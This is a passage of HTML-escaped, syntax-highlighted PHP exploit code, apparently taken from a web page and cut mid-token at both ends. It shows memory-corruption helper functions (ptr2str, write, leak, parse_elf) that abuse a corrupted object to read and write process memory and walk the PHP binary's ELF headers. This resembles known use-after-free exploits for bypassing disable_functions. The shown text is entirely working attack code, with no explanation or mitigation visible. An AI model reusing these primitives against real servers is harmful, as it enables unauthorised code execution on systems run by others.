s=&#34;variable&#34;&gt;$p&lt;/span&gt;+&lt;span class=&#34;variable&#34;&gt;$j&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$address&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ptr2str&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$ptr&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$m&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$out&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;variable&#34;&gt;$m&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$out&lt;/span&gt; .= &lt;span class=&#34;title function_ invoke__&#34;&gt;sprintf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ptr&lt;/span&gt; &amp;amp; &lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$ptr&lt;/span&gt; &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$out&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&amp;amp;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$v&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$n&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;variable&#34;&gt;$n&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;[&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;] = &lt;span class=&#34;title function_ invoke__&#34;&gt;sprintf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$v&lt;/span&gt; &amp;amp; &lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$v&lt;/span&gt; &amp;gt;&amp;gt;= &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$addr&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$helper&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$abc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$addr&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$leak&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$helper&lt;/span&gt;-&amp;gt;a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt; != &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;#123; &lt;span class=&#34;variable&#34;&gt;$leak&lt;/span&gt; %= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &amp;lt;&amp;lt; (&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$leak&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;parse_elf&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$e_type&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$e_phoff&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$e_phentsize&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x36&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$e_phnum&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; &amp;lt; &lt;span class=&#34;variable&#34;&gt;$e_phnum&lt;/span&gt;; &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$header&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$e_phoff&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; * &lt;span class=&#34;variable&#34;&gt;$e_phentsize&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$p_type&lt;/span&gt;  = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$header&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$p_flags&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$header&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$p_vaddr&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$header&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$p_memsz&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$header&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$p_type&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$p_flags&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;# PT_LOAD, PF_Read_Write&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;# handle pie&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$data_addr&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$e_type&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; ? &lt;span class=&#34;variable&#34;&gt;$p_vaddr&lt;/span&gt; : &lt;span class=&#34;variable&#34;&gt;$base&lt;/span&gt; + &lt;span class=&#34;variable&#34;&gt;$p_vaddr&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$data_size&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$p_memsz&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$p_type&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;variable&#34;&gt;$p_flags&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;# PT_LOAD, PF_Read_exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$text_size&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$p_memsz&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$data_addr&lt;/span&gt; || !&lt;span class=&#34;variable&#34;&gt;$text_size&lt;/span&gt; || !&lt;span class=&#34;variable&#34;&gt;$data_size&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; [&lt;span class=&#34;variable&#34;&gt;$data_addr&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$text_size&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$data_size&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class